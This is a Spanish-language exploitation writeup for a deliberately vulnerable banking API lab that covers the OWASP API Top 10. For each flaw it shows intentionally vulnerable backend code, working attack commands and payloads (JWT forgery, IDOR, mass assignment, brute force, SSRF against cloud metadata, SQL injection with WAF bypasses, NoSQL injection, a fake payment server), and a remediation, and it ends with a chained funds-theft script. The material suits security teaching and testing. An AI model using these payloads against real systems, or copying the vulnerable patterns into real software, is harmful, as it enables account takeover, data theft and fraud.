# NovaPay Bank API — Writeup de Explotación

> **⚠️ LABORATORIO EDUCATIVO** — API deliberadamente vulnerable.
> Todas las vulnerabilidades cubren el **OWASP API Security Top 10 2023**.

---

## 📋 Credenciales por Defecto

| Usuario | Contraseña | Rol |
|---------|-----------|-----|
| `admin` | `admin123` | admin |
| `alice` | `password123` | user |
| `bob` | `bob2024` | user |
| `carlos` | `qwerty` | user |
| `diana` | `letmein` | auditor |

**Base URL:** `http://localhost:8080`
**Swagger UI:** `http://localhost:8080/docs`
**OpenAPI JSON (para ZAP):** `http://localhost:8080/openapi.json`

### Obtener TOKEN (necesario para la mayoría de endpoints)

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo $TOKEN
```

---

## 1. 🔑 BOLA / IDOR — API1:2023 (Broken Object Level Authorization)

**Qué es:** La API no verifica que el objeto (cuenta bancaria) pertenezca al usuario autenticado.

**Impacto bancario:** Un cliente puede ver el saldo y datos de cualquier otra cuenta del banco.

### 🔍 Código vulnerable del backend

```python
# app/routes/accounts.py — Línea vulnerable
@router.get("/{account_id}")
def get_account(account_id: int, current_user: dict = Depends(get_current_user), db = ...):
    account = db.query(Account).filter(Account.id == account_id).first()

    # ❌ FALTA validación:
    # if account.owner_id != current_user["user_id"]:
    #     raise HTTPException(status_code=403, detail="Not your account")

    return account  # Retorna la cuenta de CUALQUIER usuario
```

### Explotación

```bash
# Ver MI cuenta (ID 2 = alice)
curl -s http://localhost:8080/api/accounts/2 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# VULN: Ver la cuenta de BOB (ID 4) — sin autorización
curl -s http://localhost:8080/api/accounts/4 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Enumerar TODAS las cuentas del banco
curl -s http://localhost:8080/api/accounts/ \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Remediación:** Verificar que `account.owner_id == current_user["user_id"]` antes de retornar datos.

---

## 2. 🔓 Broken Authentication — API2:2023

**Qué es:** La API implementa validación de JWT, pero tiene un fallo lógico: si la firma es inválida, el servidor captura el error e intenta decodificar el token *sin verificar la firma* usando `options={"verify_signature": False}`.

**Impacto bancario:** Un atacante puede forjar tokens para cualquier usuario (incluyendo administradores) firmándolos con cualquier clave basura, ya que el servidor ignorará la firma.

### 🔍 Código vulnerable del backend

```python
# app/auth.py
def decode_token(token):
    try:
        # Intenta decodificar normalmente
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        return payload
    except jwt.InvalidSignatureError:
        # ❌ VULN: Si la firma es inválida, lo acepta de todos modos (Signature Bypass)
        try:
            payload = jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256", "none"])
            return payload
```

### Explotación — JWT Signature Bypass

No necesitamos conocer la palabra secreta del servidor. Podemos firmar el token con una clave falsa (ej: `basura123`), la firma será inválida, pero el backend lo aceptará igual.

```bash
# 1. Forjar un token de admin usando una clave secreta cualquiera
FORGED=$(python3 -c "
import jwt
# Firmamos con 'clave_falsa' — al backend no le importará
token = jwt.encode({'user_id':1, 'username':'admin', 'role':'admin'}, 'clave_falsa', algorithm='HS256')
print(token)
")

echo "Token forjado: $FORGED"

# 2. Usar el token forjado para acceder al endpoint de admin
curl -s http://localhost:8080/api/admin/stats \
  -H "Authorization: Bearer $FORGED" | python3 -m json.tool
```

**Remediación:** Nunca usar `verify_signature: False` en producción. Si `InvalidSignatureError` ocurre, la solicitud debe ser rechazada inmediatamente con un 401 Unauthorized.

---

## 3. 📤 Excessive Data Exposure — API3:2023

**Qué es:** La respuesta del API devuelve TODOS los campos del modelo de usuario, incluyendo datos ultra-sensibles.

**Impacto bancario:** Exposición de SSN, PIN, contraseñas, y credit score de cualquier cliente.

### 🔍 Código vulnerable del backend

```python
# app/routes/users.py
@router.get("/me")
def get_my_profile(current_user = ..., db = ...):
    user = db.query(User).filter(User.id == current_user["user_id"]).first()
    return user  # ❌ Retorna TODO el objeto ORM sin filtrar

# app/schemas.py — El schema incluye campos sensibles
class UserResponse(BaseModel):
    id: int
    username: str
    role: str
    is_admin: bool
    ssn: Optional[str] = None        # ❌ Número de Seguridad Social
    pin: Optional[str] = None        # ❌ PIN de la tarjeta
    credit_score: Optional[int]      # ❌ Score crediticio
    password: Optional[str] = None   # ❌ ¡Contraseña en texto plano!
    password_hash: Optional[str]     # ❌ Hash de contraseña
```

### Explotación

```bash
curl -s http://localhost:8080/api/users/me \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Resultado:** La respuesta incluye `password`, `password_hash`, `ssn`, `pin`, `credit_score`.

**Remediación:** Crear un `UserPublicResponse` que solo exponga `id`, `username`, `email`, `full_name`.

---

## 4. 📝 Mass Assignment — API3:2023

**Qué es:** El endpoint `PUT` acepta y aplica campos internos que el usuario no debería poder modificar.

**Impacto bancario:** Un usuario se auto-escala a administrador.

### 🔍 Código vulnerable del backend

```python
# app/routes/users.py
@router.put("/me")
def update_my_profile(updates: UserUpdateRequest, current_user = ..., db = ...):
    user = db.query(User).filter(User.id == current_user["user_id"]).first()

    # ❌ Aplica TODOS los campos sin filtrar
    update_data = updates.model_dump(exclude_unset=True)
    for field, value in update_data.items():
        setattr(user, field, value)  # ← Acepta "role", "is_admin", etc.

    db.commit()
    return user

# app/schemas.py — El schema de update acepta campos peligrosos
class UserUpdateRequest(BaseModel):
    email: Optional[str] = None
    full_name: Optional[str] = None
    role: Optional[str] = None       # ❌ El usuario controla su rol
    is_admin: Optional[bool] = None  # ❌ El usuario controla si es admin
```

### Explotación (encadenada con Excessive Data Exposure)

```bash
# 1. Primero observar los campos con GET (Excessive Data Exposure)
curl -s http://localhost:8080/api/users/me \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'role={d[\"role\"]}, is_admin={d[\"is_admin\"]}')"
# → role=user, is_admin=False

# 2. Mass Assignment — escalarse a admin
curl -s -X PUT http://localhost:8080/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "is_admin": true}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'role={d[\"role\"]}, is_admin={d[\"is_admin\"]}')"
# → role=admin, is_admin=True ← 🔴 Escalación exitosa
```

**Remediación:** El schema de update solo debe aceptar campos modificables: `email`, `full_name`. Ignorar todo lo demás.

---

## 5. ⚡ Rate Limiting — API4:2023 (Unrestricted Resource Consumption)

**Qué es:** No hay límite de intentos de login. Brute force irrestricto.

**Impacto bancario:** Compromiso masivo de cuentas de clientes.

### 🔍 Código vulnerable del backend

```python
# app/routes/auth.py
@router.post("/login")
def login(req: LoginRequest, db = ...):
    user = db.query(User).filter(User.username == req.username).first()
    if not user or user.password != req.password:
        # ❌ No hay:
        # - Contador de intentos fallidos
        # - Lockout temporal (ej: 5 minutos después de 5 intentos)
        # - Delay progresivo
        # - CAPTCHA
        raise HTTPException(status_code=401, detail="Invalid credentials")
    token = create_token(user.id, user.username, user.role)
    return TokenResponse(access_token=token, ...)
```

### Explotación — Brute Force

```bash
echo "🔨 Brute force contra admin:"
for pass in password password123 admin admin123 123456 qwerty letmein; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:8080/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}")
  if [ "$CODE" = "200" ]; then
    echo "  admin:$pass → ✅ HTTP $CODE ← CONTRASEÑA ENCONTRADA"
  else
    echo "  admin:$pass → ❌ HTTP $CODE"
  fi
done
```

**Remediación:** Rate limiting (5 intentos/min), lockout temporal, delay progresivo, CAPTCHA.

---

## 6. 🚪 Broken Function Level Authorization — API5:2023

**Qué es:** El desarrollador aseguró correctamente algunos endpoints administrativos, pero **olvidó** agregar la verificación de rol en otros. Esos endpoints "olvidados" son accesibles con cualquier token válido.

**Impacto bancario:** Un atacante descubre la ruta olvidada y extrae información confidencial o realiza acciones administrativas.

### 🔍 Código vulnerable del backend

```python
# app/routes/admin.py

# ✅ EJEMPLO SEGURO — El desarrollador se acordó de evaluar el rol
@router.get("/users")
def list_all_users(current_user = Depends(...) ...):
    if current_user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Forbidden")
    return db.query(User).all()

# ❌ VULNERABILIDAD — El desarrollador olvidó copiar el "if" aquí
@router.get("/stats")
def get_system_stats(current_user = Depends(...) ...):
    # ¡Cualquier token que pase Depends(get_current_user) entra directo!
    return { "total_users": 5, "jwt_secret": "secret" ... }
```

### Explotación

```bash
# 1. Intentamos entrar al panel de usuarios con token de Alice (usuario regular)
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
# → Responde "403" (Forbidden). ¡Parece que el sistema es seguro!

# 2. Sin embargo, no nos rendimos. Probamos la ruta oculta "stats" que olvidaron proteger:
curl -s http://localhost:8080/api/admin/stats \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# → Retorna HTTP 200 OK y muestra la clave secreta del JWT
```

**Remediación:** Usar un modelo de seguridad por defecto (ej. requerir Admin de forma global en todo el router `/api/admin` usando dependencias de FastAPI), en lugar de confiar en que el programador escribirá el `if` en cada función individual.

---

## 7. 💸 Business Logic Flaws — API6:2023

**Qué es:** La lógica de transferencia tiene múltiples fallas: no valida ownership, no verifica balance, acepta negativos.

**Impacto bancario:** Robo de fondos, generación de dinero, manipulación de balances.

### 🔍 Código vulnerable del backend

```python
# app/routes/transactions.py
@router.post("/transfer")
def transfer_funds(req: TransferRequest, current_user = ..., db = ...):
    from_account = db.query(Account).filter(Account.id == req.from_account_id).first()
    to_account = db.query(Account).filter(Account.id == req.to_account_id).first()

    # ❌ No verifica que from_account pertenezca al usuario autenticado
    # ❌ No verifica que el balance sea suficiente
    # ❌ No valida que amount > 0
    # ❌ No previene transferencia a sí mismo

    from_account.balance -= req.amount  # Si amount es negativo, SUMA
    to_account.balance += req.amount    # Si amount es negativo, RESTA
    # Un amount de -10000 invierte la dirección del dinero
```

### Explotación

```bash
# 1. Robar fondos — transferir desde cuenta de BOB (sin ser dueño)
curl -s -X POST http://localhost:8080/api/transactions/transfer \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 4, "to_account_id": 2, "amount": 5000}' | python3 -m json.tool

# 2. Monto negativo — invierte la dirección (roba dinero en reversa)
curl -s -X POST http://localhost:8080/api/transactions/transfer \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 2, "to_account_id": 4, "amount": -10000}' | python3 -m json.tool
# Alice envía -10000 → Le suman 10000 a ella, le restan a Bob

# 3. Overdraft — transferir más de lo disponible
curl -s -X POST http://localhost:8080/api/transactions/transfer \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 5, "to_account_id": 2, "amount": 999999}' | python3 -m json.tool
```

**Remediación:** Validar ownership, `amount > 0`, `balance >= amount`, y `from != to`.

---

## 8. 🌐 SSRF — API7:2023 (Server Side Request Forgery)

**Qué es:** El servidor hace requests HTTP a URLs proporcionadas por el usuario sin ninguna validación.

**Impacto bancario:** Acceso a metadata cloud (AWS/GCP), bases de datos internas, port scanning de la red interna.

### 🔍 Código vulnerable del backend

```python
# app/routes/webhooks.py
@router.post("/webhook")
async def register_webhook(req: WebhookRequest, current_user = ...):
    # ❌ No valida la URL — acepta cualquier destino
    # ❌ No bloquea rangos internos (127.0.0.1, 169.254.x, 10.x, etc.)
    # ❌ verify=False = desactiva validación SSL
    async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
        response = await client.get(req.url)  # ← El servidor visita la URL del atacante
        return {
            "url": req.url,
            "verification_status": response.status_code,
            "verification_response": response.text[:500],  # ❌ Retorna el contenido interno
        }
```

### Explotación

```bash
# 1. SSRF — Leer la propia API internamente (bypass de autenticación)
curl -s -X POST http://localhost:8080/api/notifications/webhook \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:8080/api/admin/stats"}' | python3 -m json.tool

# 2. SSRF — Intentar metadata de cloud (AWS EC2)
curl -s -X POST http://localhost:8080/api/notifications/webhook \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}' | python3 -m json.tool

# 3. SSRF — Port scanning (detecta si un puerto está abierto)
curl -s -X POST http://localhost:8080/api/notifications/webhook \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:22"}' | python3 -m json.tool
# Si retorna "connection_refused" → el host existe pero el puerto está cerrado
```

**Remediación:** Allowlist de dominios, bloquear rangos privados, validar schema `https://` only.

---

## 9. 💉 SQL Injection — API8:2023 (Security Misconfiguration)

**Qué es:** El parámetro de búsqueda se concatena directamente en el query SQL.

**Impacto bancario:** Extracción de toda la base de datos: usuarios, contraseñas, SSN, balances.

### 🔍 Código vulnerable del backend

```python
# app/routes/transactions.py — ¡NUNCA hacer esto!
@router.get("/search")
def search_transactions(q: str = "", current_user = ..., db = ...):
    # ❌ Concatenación directa de input del usuario en SQL
    query = f"SELECT * FROM transactions WHERE description LIKE '%{q}%'"
    result = db.execute(text(query))  # ← Ejecuta lo que sea que inyecte el usuario
    #
    # Si q = "' OR '1'='1"
    # Query final: SELECT * FROM transactions WHERE description LIKE '%' OR '1'='1%'
    # → Retorna TODAS las transacciones
    #
    # Si q = "' UNION SELECT id,username,password,... FROM users--"
    # → Extrae la tabla de usuarios completa
```

### Explotación — Endpoint sin protección (`/search`)

```bash
# 1. Bypass WHERE — listar todas las transacciones
curl -s "http://localhost:8080/api/transactions/search?q=' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{d[\"count\"]} transacciones extraídas')"

# 2. UNION — extraer tabla de usuarios (8 columnas para coincidir con transactions)
curl -s "http://localhost:8080/api/transactions/search?q=' UNION SELECT id,username,password,email,role,ssn,pin,credit_score FROM users--" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### 🔥 Bypass WAF con Mixed Case (`/search-secure`)

El endpoint `/search-secure` tiene un WAF que bloquea `UNION`, `SELECT`, etc. **pero solo si aparecen en MAYÚSCULAS EXACTAS**.

```python
# Código del WAF del backend:
blocked_keywords = ["UNION", "SELECT", "DROP", "DELETE", "INSERT", "UPDATE"]
for keyword in blocked_keywords:
    if keyword in q:  # ❌ Solo busca "UNION" exacto, no "uNiOn"
        return {"error": "blocked"}
# Si pasa el WAF → ejecuta el SQL igual que /search
```

```bash
# BLOQUEADO:
curl -s "http://localhost:8080/api/transactions/search-secure?q=' UNION SELECT id FROM users--" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# → "blocked_keyword": "UNION"

# ✅ BYPASS — Mixed Case (SQLite ejecuta uNiOn igual que UNION):
curl -s "http://localhost:8080/api/transactions/search-secure?q=' uNiOn SeLeCt id,username,password,email,role,ssn,pin,credit_score FrOm users--" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# → ¡Devuelve todos los usuarios con contraseñas!
```

### 🔥 Bypass WAF con Base64 (`/search-b64`)

El endpoint `/search-b64` tiene un WAF "avanzado" que bloquea incluso `'`, `;` y `--`. **Pero el servidor decodifica el input en Base64 DESPUÉS de la inspección del WAF**.

```python
# Código del backend:
blocked_keywords = ["UNION", "SELECT", "DROP", "DELETE", "'", ";", "--"]
for keyword in blocked_keywords:
    if keyword in q:       # WAF inspecciona el string RAW (aún en Base64)
        return {"error": "blocked"}

decoded_q = base64.b64decode(q).decode("utf-8")  # ← Decodifica DESPUÉS del WAF
query = f"SELECT * FROM transactions WHERE description LIKE '%{decoded_q}%'"
#                                                            ↑ Inyecta el decodificado
```

```bash
# 1. Nuestro payload SQL
PAYLOAD="' UNION SELECT id,username,password,email,role,ssn,pin,credit_score FROM users--"

# 2. Lo codificamos en Base64
B64=$(echo -n "$PAYLOAD" | base64)
echo "Base64: $B64"
# → JyBVTklPTiBTRUxFQ1QgaWQsdXNlcm5hbWUscGFzc3dvcmQsZW1haWwscm9sZSxzc24scGluLGNyZWRpdF9zY29yZSBGUk9NIHVzZXJzLS0=

# 3. Enviar el payload codificado — el WAF no detecta keywords en Base64
curl -s "http://localhost:8080/api/transactions/search-b64?q=$B64" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# → decoded_input muestra el SQL decodificado
# → results contiene todos los usuarios extraídos
```

**Lección clave:** Un WAF basado en blacklist SIEMPRE se puede evadir. La solución correcta es usar **parameterized queries** (prepared statements):

```python
# ✅ Forma SEGURA:
query = text("SELECT * FROM transactions WHERE description LIKE :q")
result = db.execute(query, {"q": f"%{q}%"})
```

---

## 10. 🍃 NoSQL Injection — API8:2023

**Qué es:** El endpoint acepta operadores de MongoDB directamente del body JSON sin validar el tipo de datos.

**Impacto bancario:** Extracción del directorio completo de empleados; filtrado por nivel de clearance.

### 🔍 Código vulnerable del backend

```python
# app/routes/search.py
@router.post("/users")
async def search_users(request: Request):
    body = await request.json()
    results = nosql_query(body)  # ← Pasa el body directo al motor NoSQL
    return {"results": results}

# app/database.py — Motor NoSQL que acepta operadores
def nosql_query(filter_dict: dict) -> list:
    for doc in nosql_users_collection:
        for key, value in filter_dict.items():
            if isinstance(value, dict):  # ❌ Acepta objetos como operadores
                for op, op_val in value.items():
                    if op == "$gt":      # {"username": {"$gt": ""}} → todo mayor que ""
                        if not (doc[key] > op_val): match = False
                    elif op == "$ne":    # {"clearance": {"$ne": "low"}} → todo excepto low
                        if not (doc[key] != op_val): match = False
                    elif op == "$regex": # {"username": {"$regex": "^a"}} → regex
                        if not re.search(op_val, doc[key]): match = False
```

### Explotación

```bash
# 1. Extraer TODOS los usuarios ($gt con string vacío → todo es mayor que "")
curl -s -X POST http://localhost:8080/api/search/users \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}}' | python3 -m json.tool

# 2. Usuarios con clearance alta
curl -s -X POST http://localhost:8080/api/search/users \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"clearance": {"$ne": "low"}}' | python3 -m json.tool

# 3. Regex — buscar usuarios que empiecen con "admin"
curl -s -X POST http://localhost:8080/api/search/users \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^admin"}}' | python3 -m json.tool
```

**Remediación:** Validar que el value sea `str`, no `dict`. Rechazar cualquier operador.

---

## 11. 🪧 Sensitive Data in Response Headers — API8:2023

**Qué es:** Todas las respuestas incluyen headers que exponen la tecnología, versión, y configuración interna.

**Impacto bancario:** Un atacante identifica exactamente qué framework, OS y base de datos buscar CVEs.

### 🔍 Código vulnerable del backend

```python
# app/main.py — Middleware que agrega headers inseguros a CADA respuesta
@app.middleware("http")
async def add_insecure_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Powered-By"] = "FastAPI/0.104.1 Python/3.11"     # ❌ Stack tecnológico
    response.headers["Server"] = "NovaPay-Internal/2.3.1 Ubuntu"         # ❌ Versión interna + OS
    response.headers["X-Internal-Version"] = "2.3.1-build-4892"          # ❌ Build exacto
    response.headers["X-Debug-Mode"] = "enabled"                         # ❌ Debug en producción
    response.headers["X-Backend-Server"] = "api-node-03.internal.novapay.com"  # ❌ Hostname
    response.headers["X-Database"] = "SQLite-3.42.0"                     # ❌ Motor de DB + versión
    return response
```

### Explotación

```bash
curl -sI http://localhost:8080/health 2>&1 | grep -E "^[Xx]-|^Server:"
```

**Resultado:**
```
Server: NovaPay-Internal/2.3.1 Ubuntu
X-Powered-By: FastAPI/0.104.1 Python/3.11
X-Internal-Version: 2.3.1-build-4892
X-Debug-Mode: enabled
X-Backend-Server: api-node-03.internal.novapay.com
X-Database: SQLite-3.42.0
```

**Remediación:** Eliminar o sobrescribir headers técnicos. Nunca exponer versiones ni hostnames internos.

---

## 12. 🗂️ Improper Inventory Management — API9:2023

**Qué es:** Versiones antiguas de la API permanecen accesibles sin autenticación y exponen datos críticos.

**Impacto bancario:** Acceso directo a TODAS las cuentas y contraseñas sin necesidad de autenticarse.

### 🔍 Código vulnerable del backend

```python
# app/routes/legacy.py — ¡SIN Depends(get_current_user)!
@router.get("/api/v1/users/{user_id}")
def legacy_get_user(user_id: int, db = ...):
    # ❌ No requiere autenticación (falta Depends(get_current_user))
    user = db.query(User).filter(User.id == user_id).first()
    return {
        "username": user.username,
        "password": user.password,  # ❌ Retorna contraseña en texto plano
        "ssn": user.ssn,            # ❌ Retorna SSN
        "pin": user.pin,            # ❌ Retorna PIN
    }
```

### Explotación

```bash
# SIN TOKEN — no necesita autenticación
# Listar todos los usuarios con sus contraseñas
curl -s http://localhost:8080/api/v1/users | python3 -m json.tool

# Ver el admin con contraseña en texto plano
curl -s http://localhost:8080/api/v1/users/1 | python3 -m json.tool

# Descubrir la documentación vieja
curl -s http://localhost:8080/api-old/docs | python3 -m json.tool
```

**Remediación:** Descomisionar endpoints legacy. Implementar inventario formal de API endpoints.

---

## 13. 🔗 Unsafe Consumption of APIs — API10:2023

**Qué es:** La API consume un servicio externo de pagos sin validar SSL, sin verificar la respuesta, y confía ciegamente en el monto retornado.

**Impacto bancario:** Un atacante monta un servidor falso que retorna montos inflados → acredita dinero inexistente.

### 🔍 Código vulnerable del backend

```python
# app/routes/payments.py
@router.post("/external")
async def process_external_payment(req: ExternalPaymentRequest, ...):
    # ❌ verify=False — no valida certificado SSL
    # ❌ La URL es controlada por el usuario
    async with httpx.AsyncClient(verify=False) as client:
        response = await client.post(req.provider_url, json={...})
        provider_data = response.json()

        if provider_data.get("approved"):
            # ❌ Confía ciegamente en amount_credited del proveedor externo
            credited = provider_data.get("amount_credited", req.amount)
            account.balance += credited  # Si el atacante dice $999,999 → lo aplica
            db.commit()
```

### Explotación

```bash
# 1. Montar servidor malicioso (en otra terminal dentro del container o en el host)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'approved': True,
            'amount_credited': 999999.99,
            'transaction_id': 'FAKE-001'
        }).encode())
    def log_message(self, *args): pass

print('Malicious payment server on :9999')
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
" &

# 2. Hacer el pago externo apuntando al servidor malicioso
curl -s -X POST http://localhost:8080/api/payments/external \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"provider_url": "http://host.docker.internal:9999/pay", "account_id": 2, "amount": 100}' | python3 -m json.tool
# → amount_credited: 999999.99 — ¡se acreditó casi un millón en vez de $100!
```

**Remediación:** Allowlist de providers, validar SSL, verificar que `amount_credited == amount` solicitado.

---

## 🔥 BONUS: Escenario de Ataque Encadenado

### "De usuario regular a robo total de fondos — en 4 pasos"

```bash
# ══════════════════════════════════════════════════════════════
# PASO 1: Reconnaissance — Excessive Data Exposure (API3)
# ══════════════════════════════════════════════════════════════
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "🔍 Paso 1: Reconocimiento..."
curl -s http://localhost:8080/api/users/me -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'→ Descubierto: role={d[\"role\"]}, is_admin={d[\"is_admin\"]}')"

# ══════════════════════════════════════════════════════════════
# PASO 2: Privilege Escalation — Mass Assignment (API3)
# ══════════════════════════════════════════════════════════════
echo "⬆️ Paso 2: Escalando privilegios..."
curl -s -X PUT http://localhost:8080/api/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"role": "admin", "is_admin": true}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'→ Ahora: role={d[\"role\"]}, is_admin={d[\"is_admin\"]}')"

# ══════════════════════════════════════════════════════════════
# PASO 3: Enumeration — Broken Function Level Auth (API5)
# ══════════════════════════════════════════════════════════════
echo "📋 Paso 3: Enumerando víctimas..."
curl -s http://localhost:8080/api/admin/users -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json; [print(f'  → {u[\"username\"]} (ID:{u[\"id\"]}) SSN:{u[\"ssn\"]}') for u in json.load(sys.stdin)]"

# ══════════════════════════════════════════════════════════════
# PASO 4: Exfiltration — BOLA + Business Logic (API1 + API6)
# ══════════════════════════════════════════════════════════════
echo "💰 Paso 4: Robando fondos de Carlos..."
curl -s -X POST http://localhost:8080/api/transactions/transfer \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id": 6, "to_account_id": 2, "amount": 50000}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'→ Transferencia #{d[\"id\"]}: \${d[\"amount\"]} robados')"

echo "✅ Ataque completado — 4 vulnerabilidades encadenadas"
```

### Resultado:
1. **Excessive Data Exposure** → reveló la estructura interna del usuario
2. **Mass Assignment** → escalación a admin
3. **Broken Function Level Auth** → acceso al panel admin, enumerar víctimas
4. **BOLA + Business Logic** → robo de $50,000 sin checks de ownership

**Lección:** Cada vulnerabilidad individual parece de riesgo medio, pero encadenadas llevan al **compromiso total del sistema bancario**.

---

## 📥 Importar en OWASP ZAP

1. Descargar el spec: `curl -o novapay-openapi.json http://localhost:8080/openapi.json`
2. En ZAP: **Import** → **Import an OpenAPI definition from a File**
3. Seleccionar `novapay-openapi.json`
4. Target: `http://localhost:8080`
5. Ejecutar **Active Scan**

---

## 📊 Resumen de Cobertura OWASP API 2023

| OWASP | Categoría | Demostrado |
|---|---|---|
| API1:2023 | Broken Object Level Authorization | ✅ BOLA/IDOR |
| API2:2023 | Broken Authentication | ✅ JWT débil |
| API3:2023 | Broken Object Property Level Authorization | ✅ Excessive Data Exposure + Mass Assignment |
| API4:2023 | Unrestricted Resource Consumption | ✅ Rate Limiting |
| API5:2023 | Broken Function Level Authorization | ✅ Admin sin role check |
| API6:2023 | Unrestricted Access to Sensitive Business Flows | ✅ Business Logic Flaws |
| API7:2023 | Server Side Request Forgery | ✅ SSRF via webhook |
| API8:2023 | Security Misconfiguration | ✅ SQLi + WAF Bypass (mixed case + Base64) + NoSQLi + Headers |
| API9:2023 | Improper Inventory Management | ✅ Legacy v1 sin auth |
| API10:2023 | Unsafe Consumption of APIs | ✅ External payment sin validación |
